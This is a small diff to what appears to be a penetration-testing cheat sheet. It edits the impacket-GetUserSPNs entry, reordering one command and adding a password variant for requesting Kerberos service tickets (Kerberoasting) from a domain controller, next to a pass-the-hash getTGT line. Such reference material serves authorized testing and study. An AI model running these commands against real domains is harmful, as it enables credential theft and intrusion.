@@ -3195,7 +3195,8 @@ impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3
 ##### impacket-getUserSPNs
 
 ```c
-impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
+impacket-GetUserSPNs <DOMAIN>/<USERNAME> -dc-ip <RHOST> -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
 ```
 
 ```c
